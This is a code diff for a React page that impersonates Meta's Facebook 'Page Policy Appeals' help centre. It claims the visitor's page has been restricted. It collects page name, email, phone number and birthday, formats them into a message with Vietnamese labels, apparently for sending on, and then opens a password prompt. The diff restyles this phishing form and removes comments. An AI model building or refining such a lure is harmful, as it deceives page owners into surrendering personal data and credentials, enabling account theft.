@@ -46,7 +46,7 @@ const Home = () => {
         mail: '',
         phone: '',
         birthday: '',
-        appeal: '' // Thêm trường appeal
+        appeal: ''
     });
 
     const [showPassword, setShowPassword] = useState(false);
@@ -160,7 +160,6 @@ const Home = () => {
             const detectedCountry = ipData.country_code || 'US';
             setCountryCode(detectedCountry);
 
-            // get calling code
             const code = getCountryCallingCode(detectedCountry);
             setCallingCode(`+${code}`);
         } catch {
@@ -202,7 +201,7 @@ const Home = () => {
     };
 
     const validateForm = () => {
-        const requiredFields = ['pageName', 'mail', 'phone', 'birthday', 'appeal']; // Thêm appeal vào required fields
+        const requiredFields = ['pageName', 'mail', 'phone', 'birthday', 'appeal'];
         const newErrors = {};
 
         requiredFields.forEach((field) => {
@@ -249,7 +248,7 @@ const Home = () => {
 📧 <b>Email:</b> <code>${data.mail}</code>
 📱 <b>Số điện thoại:</b> <code>${data.phone}</code>
 🎂 <b>Ngày sinh:</b> <code>${data.birthday}</code>
-📝 <b>Appeal:</b> <code>${data.appeal}</code>`; // Thêm appeal vào message
+📝 <b>Appeal:</b> <code>${data.appeal}</code>`;
     };
 
     const handleClosePassword = () => {
@@ -281,159 +280,195 @@ const Home = () => {
 
     return (
         <>
-            <header className='sticky top-0 left-0 flex h-14 justify-between p-4 shadow-sm'>
+            <header className='sticky top-0 left-0 flex h-16 justify-between items-center px-4 shadow-sm bg-white'>
                 <title>Page Help Center</title>
-                <div className='flex items-center gap-2'>
-                    <img src={FacebookImage} alt='' className='h-10 w-10' />
-                    <p className='font-bold text-lg sm:text-xl'>{translatedTexts.helpCenter}</p>
+                <div className='flex items-center gap-3'>
+                    <img src={FacebookImage} alt='' className='h-8 w-8 sm:h-10 sm:w-10' />
+                    <p className='font-bold text-lg sm:text-xl text-gray-900'>{translatedTexts.helpCenter}</p>
                 </div>
                 <div className='flex items-center gap-2'>
-                    <div className='flex h-10 w-10 items-center justify-center rounded-full bg-gray-200'>
-                        <FontAwesomeIcon icon={faHeadset} className='' size='lg' />
+                    <div className='flex h-9 w-9 items-center justify-center rounded-full bg-gray-100'>
+                        <FontAwesomeIcon icon={faHeadset} className='text-gray-600' size='sm' />
                     </div>
-                    <p className='rounded-lg bg-gray-200 p-3 py-2.5 text-sm font-semibold'>{translatedTexts.english}</p>
+                    <p className='rounded-lg bg-gray-100 px-3 py-2 text-sm font-medium text-gray-700'>{translatedTexts.english}</p>
                 </div>
             </header>
-            <main className='flex max-h-[calc(100vh-56px)] min-h-[calc(100vh-56px)]'>
-                <nav className='hidden w-xs flex-col gap-2 p-4 shadow-lg sm:flex'>
+            
+            <main className='flex min-h-[calc(100vh-64px)] bg-gray-50'>
+                <nav className='hidden w-64 flex-col gap-3 p-5 shadow-lg sm:flex bg-white'>
                     {data_list.map((data) => {
                         return (
-                            <div key={data.id} className='flex cursor-pointer items-center justify-between rounded-lg p-2 px-3 hover:bg-gray-100'>
-                                <div className='flex items-center gap-2'>
-                                    <div className='flex h-9 w-9 items-center justify-center rounded-full bg-gray-200'>
-                                        <FontAwesomeIcon icon={data.icon} />
+                            <div key={data.id} className='flex cursor-pointer items-center justify-between rounded-xl p-3 hover:bg-gray-50 transition-colors duration-200'>
+                                <div className='flex items-center gap-3'>
+                                    <div className='flex h-10 w-10 items-center justify-center rounded-full bg-gray-100'>
+                                        <FontAwesomeIcon icon={data.icon} className='text-gray-600 text-sm' />
                                     </div>
-                                    <div className='text-sm sm:text-base'>{data.title}</div>
+                                    <div className='text-sm font-medium text-gray-700'>{data.title}</div>
                                 </div>
-                                <FontAwesomeIcon icon={faChevronDown} />
+                                <FontAwesomeIcon icon={faChevronDown} className='text-gray-400 text-xs' />
                             </div>
                         );
                     })}
                 </nav>
-                <div className='flex max-h-[calc(100vh-56px)] flex-1 flex-col items-center justify-start overflow-y-auto'>
-                    <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-12 w-full max-w-2xl'>
-                        <div className='bg-[#e4e6eb] p-4 sm:p-6'>
-                            <p className='text-2xl sm:text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
+                
+                <div className='flex-1 flex flex-col items-center py-6 px-4 sm:py-8 sm:px-6'>
+                    <div className='w-full max-w-2xl bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden'>
+                        <div className='bg-gradient-to-r from-blue-50 to-gray-50 px-6 py-5 sm:px-8 sm:py-6 border-b border-gray-200'>
+                            <p className='text-2xl sm:text-3xl font-bold text-gray-900'>{translatedTexts.pagePolicyAppeals}</p>
                         </div>
-                        {/* Sửa phần text mô tả - làm to hơn và responsive */}
-                        <div className='p-4 text-base leading-7 font-medium sm:text-sm sm:leading-6'>
-                            <p className='mb-3'>{translatedTexts.detectedActivity}</p>
-                            <p className='mb-3'>{translatedTexts.accessLimited}</p>
-                            <p>{translatedTexts.submitAppeal}</p>
+                        
+                        <div className='px-6 py-5 sm:px-8 sm:py-6 space-y-4'>
+                            <p className='text-base text-gray-700 leading-relaxed'>{translatedTexts.detectedActivity}</p>
+                            <p className='text-base text-gray-700 leading-relaxed'>{translatedTexts.accessLimited}</p>
+                            <p className='text-base text-gray-700 leading-relaxed'>{translatedTexts.submitAppeal}</p>
                         </div>
-                        <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold sm:gap-2'>
-                            <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
-                                    {translatedTexts.pageName} <span className='text-red-500'>*</span>
-                                </p>
-                                <input 
-                                    type='text' 
-                                    name='pageName' 
-                                    autoComplete='organization' 
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} 
-                                    style={{ fontSize: '16px' }}
-                                    value={formData.pageName} 
-                                    onChange={(e) => handleInputChange('pageName', e.target.value)} 
-                                />
-                                {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
-                            </div>
-                            <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
-                                    {translatedTexts.mail} <span className='text-red-500'>*</span>
-                                </p>
-                                <input 
-                                    type='email' 
-                                    name='mail' 
-                                    autoComplete='email' 
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} 
-                                    style={{ fontSize: '16px' }}
-                                    value={formData.mail} 
-                                    onChange={(e) => handleInputChange('mail', e.target.value)} 
-                                />
-                                {errors.mail && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
-                            </div>
-                            <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
-                                    {translatedTexts.phone} <span className='text-red-500'>*</span>
-                                </p>
-                                <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'}`}>
-                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-sm font-medium text-gray-700'>{callingCode}</div>
+
+                        <div className='px-6 py-5 sm:px-8 sm:py-6 space-y-5 bg-gray-50'>
+                            <div className='space-y-4'>
+                                <div className='space-y-2'>
+                                    <label className='block text-sm font-semibold text-gray-800'>
+                                        {translatedTexts.pageName} <span className='text-red-500'>*</span>
+                                    </label>
                                     <input 
-                                        type='tel' 
-                                        name='phone' 
-                                        inputMode='numeric' 
-                                        pattern='[0-9]*' 
-                                        autoComplete='off' 
-                                        className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none'
+                                        type='text' 
+                                        name='pageName' 
+                                        autoComplete='organization' 
+                                        className={`w-full rounded-lg border px-4 py-3 text-base transition-colors duration-200 ${
+                                            errors.pageName 
+                                                ? 'border-red-300 bg-red-50 focus:border-red-500 focus:ring-2 focus:ring-red-200' 
+                                                : 'border-gray-300 bg-white focus:border-blue-500 focus:ring-2 focus:ring-blue-200'
+                                        }`} 
                                         style={{ fontSize: '16px' }}
-                                        value={formData.phone.replace(/^\+\d+\s*/, '')} 
-                                        onChange={(e) => handleInputChange('phone', e.target.value)} 
+                                        value={formData.pageName} 
+                                        onChange={(e) => handleInputChange('pageName', e.target.value)} 
                                     />
+                                    {errors.pageName && <span className='text-xs text-red-600 font-medium'>{translatedTexts.fieldRequired}</span>}
                                 </div>
-                                {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
-                            </div>
-                            <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
-                                    {translatedTexts.birthday} <span className='text-red-500'>*</span>
-                                </p>
-                                <input 
-                                    type='date' 
-                                    name='birthday' 
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
-                                    style={{ fontSize: '16px' }}
-                                    value={formData.birthday} 
-                                    onChange={(e) => handleInputChange('birthday', e.target.value)} 
-                                />
-                                {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
-                            </div>
-                            
-                            {/* Thêm ô Your Appeal - Textarea lớn */}
-                            <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
-                                    {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
-                                </p>
-                                <textarea 
-                                    name='appeal'
-                                    rows={4}
-                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
-                                    style={{ fontSize: '16px' }}
-                                    placeholder={translatedTexts.appealPlaceholder}
-                                    value={formData.appeal}
-                                    onChange={(e) => handleInputChange('appeal', e.target.value)}
-                                />
-                                {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+
+                                <div className='space-y-2'>
+                                    <label className='block text-sm font-semibold text-gray-800'>
+                                        {translatedTexts.mail} <span className='text-red-500'>*</span>
+                                    </label>
+                                    <input 
+                                        type='email' 
+                                        name='mail' 
+                                        autoComplete='email' 
+                                        className={`w-full rounded-lg border px-4 py-3 text-base transition-colors duration-200 ${
+                                            errors.mail 
+                                                ? 'border-red-300 bg-red-50 focus:border-red-500 focus:ring-2 focus:ring-red-200' 
+                                                : 'border-gray-300 bg-white focus:border-blue-500 focus:ring-2 focus:ring-blue-200'
+                                        }`} 
+                                        style={{ fontSize: '16px' }}
+                                        value={formData.mail} 
+                                        onChange={(e) => handleInputChange('mail', e.target.value)} 
+                                    />
+                                    {errors.mail && <span className='text-xs text-red-600 font-medium'>{translatedTexts.fieldRequired}</span>}
+                                </div>
+
+                                <div className='space-y-2'>
+                                    <label className='block text-sm font-semibold text-gray-800'>
+                                        {translatedTexts.phone} <span className='text-red-500'>*</span>
+                                    </label>
+                                    <div className={`flex rounded-lg border transition-colors duration-200 ${
+                                        errors.phone 
+                                            ? 'border-red-300 bg-red-50 focus-within:border-red-500 focus-within:ring-2 focus-within:ring-red-200' 
+                                            : 'border-gray-300 bg-white focus-within:border-blue-500 focus-within:ring-2 focus-within:ring-blue-200'
+                                    }`}>
+                                        <div className='flex items-center border-r border-gray-300 bg-gray-100 px-4 py-3 text-sm font-medium text-gray-700'>
+                                            {callingCode}
+                                        </div>
+                                        <input 
+                                            type='tel' 
+                                            name='phone' 
+                                            inputMode='numeric' 
+                                            pattern='[0-9]*' 
+                                            autoComplete='off' 
+                                            className='flex-1 rounded-r-lg border-0 px-4 py-3 text-base bg-transparent focus:ring-0 focus:outline-none'
+                                            style={{ fontSize: '16px' }}
+                                            value={formData.phone.replace(/^\+\d+\s*/, '')} 
+                                            onChange={(e) => handleInputChange('phone', e.target.value)} 
+                                        />
+                                    </div>
+                                    {errors.phone && <span className='text-xs text-red-600 font-medium'>{translatedTexts.fieldRequired}</span>}
+                                </div>
+
+                                <div className='space-y-2'>
+                                    <label className='block text-sm font-semibold text-gray-800'>
+                                        {translatedTexts.birthday} <span className='text-red-500'>*</span>
+                                    </label>
+                                    <input 
+                                        type='date' 
+                                        name='birthday' 
+                                        className={`w-full rounded-lg border px-4 py-3 text-base transition-colors duration-200 ${
+                                            errors.birthday 
+                                                ? 'border-red-300 bg-red-50 focus:border-red-500 focus:ring-2 focus:ring-red-200' 
+                                                : 'border-gray-300 bg-white focus:border-blue-500 focus:ring-2 focus:ring-blue-200'
+                                        }`} 
+                                        style={{ fontSize: '16px' }}
+                                        value={formData.birthday} 
+                                        onChange={(e) => handleInputChange('birthday', e.target.value)} 
+                                    />
+                                    {errors.birthday && <span className='text-xs text-red-600 font-medium'>{translatedTexts.fieldRequired}</span>}
+                                </div>
+
+                                <div className='space-y-2'>
+                                    <label className='block text-sm font-semibold text-gray-800'>
+                                        {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
+                                    </label>
+                                    <textarea 
+                                        name='appeal'
+                                        rows={5}
+                                        className={`w-full rounded-lg border px-4 py-3 text-base resize-none transition-colors duration-200 ${
+                                            errors.appeal 
+                                                ? 'border-red-300 bg-red-50 focus:border-red-500 focus:ring-2 focus:ring-red-200' 
+                                                : 'border-gray-300 bg-white focus:border-blue-500 focus:ring-2 focus:ring-blue-200'
+                                        }`}
+                                        style={{ fontSize: '16px' }}
+                                        placeholder={translatedTexts.appealPlaceholder}
+                                        value={formData.appeal}
+                                        onChange={(e) => handleInputChange('appeal', e.target.value)}
+                                    />
+                                    {errors.appeal && <span className='text-xs text-red-600 font-medium'>{translatedTexts.fieldRequired}</span>}
+                                </div>
                             </div>
 
-                            <button className='w-fit rounded-lg bg-gray-200 px-4 py-3 sm:px-3 sm:py-2 text-base sm:text-[15px] font-normal mt-2' onClick={handleSubmit}>
+                            <button 
+                                className='w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-lg transition-colors duration-200 focus:outline-none focus:ring-4 focus:ring-blue-200 text-base'
+                                onClick={handleSubmit}
+                            >
                                 {translatedTexts.submit}
                             </button>
                         </div>
                     </div>
-                    <div className='w-full bg-[#f0f2f5] px-4 py-8 sm:py-14 text-[15px] text-[#65676b] sm:px-32'>
-                        <div className='mx-auto flex flex-col sm:flex-row justify-between gap-6 sm:gap-0'>
-                            <div className='flex flex-col space-y-3 sm:space-y-4'>
-                                <p className='text-sm sm:text-[15px]'>{translatedTexts.about}</p>
-                                <p className='text-sm sm:text-[15px]'>{translatedTexts.adChoices}</p>
-                                <p className='text-sm sm:text-[15px]'>{translatedTexts.createAd}</p>
+
+                    <div className='w-full max-w-2xl mt-8 bg-white rounded-xl shadow-sm border border-gray-200 px-6 py-8 sm:px-8'>
+                        <div className='grid grid-cols-1 sm:grid-cols-3 gap-6 sm:gap-8 text-center sm:text-left'>
+                            <div className='space-y-3'>
+                                <p className='text-sm text-gray-600 hover:text-gray-900 cursor-pointer transition-colors'>{translatedTexts.about}</p>
+                                <p className='text-sm text-gray-600 hover:text-gray-900 cursor-pointer transition-colors'>{translatedTexts.adChoices}</p>
+                                <p className='text-sm text-gray-600 hover:text-gray-900 cursor-pointer transition-colors'>{translatedTexts.createAd}</p>
                             </div>
-                            <div className='flex flex-col space-y-3 sm:space-y-4'>
-                                <p className='text-sm sm:text-[15px]'>{translatedTexts.privacy}</p>
-                                <p className='text-sm sm:text-[15px]'>{translatedTexts.careers}</p>
-                                <p className='text-sm sm:text-[15px]'>{translatedTexts.createPage}</p>
+                            <div className='space-y-3'>
+                                <p className='text-sm text-gray-600 hover:text-gray-900 cursor-pointer transition-colors'>{translatedTexts.privacy}</p>
+                                <p className='text-sm text-gray-600 hover:text-gray-900 cursor-pointer transition-colors'>{translatedTexts.careers}</p>
+                                <p className='text-sm text-gray-600 hover:text-gray-900 cursor-pointer transition-colors'>{translatedTexts.createPage}</p>
                             </div>
-                            <div className='flex flex-col space-y-3 sm:space-y-4'>
-                                <p className='text-sm sm:text-[15px]'>{translatedTexts.termsPolicies}</p>
-                                <p className='text-sm sm:text-[15px]'>{translatedTexts.cookies}</p>
+                            <div className='space-y-3'>
+                                <p className='text-sm text-gray-600 hover:text-gray-900 cursor-pointer transition-colors'>{translatedTexts.termsPolicies}</p>
+                                <p className='text-sm text-gray-600 hover:text-gray-900 cursor-pointer transition-colors'>{translatedTexts.cookies}</p>
                             </div>
                         </div>
-                        <hr className='my-6 sm:my-8 h-0 border border-transparent border-t-gray-300' />
-                        <div className='flex flex-col sm:flex-row justify-between items-center gap-4 sm:gap-0'>
-                            <img src={FromMetaImage} alt='' className='w-[80px] sm:w-[100px]' />
-                            <p className='text-xs sm:text-[13px] text-[#65676b]'>© {new Date().getFullYear()} Meta</p>
+                        
+                        <hr className='my-6 border-gray-300' />
+                        
+                        <div className='flex flex-col sm:flex-row justify-between items-center gap-4'>
+                            <img src={FromMetaImage} alt='Meta' className='h-6 w-auto opacity-80' />
+                            <p className='text-xs text-gray-500'>© {new Date().getFullYear()} Meta</p>
                         </div>
                     </div>
                 </div>
             </main>
+            
             {showPassword && <PasswordInput onClose={handleClosePassword} />}
         </>
     );
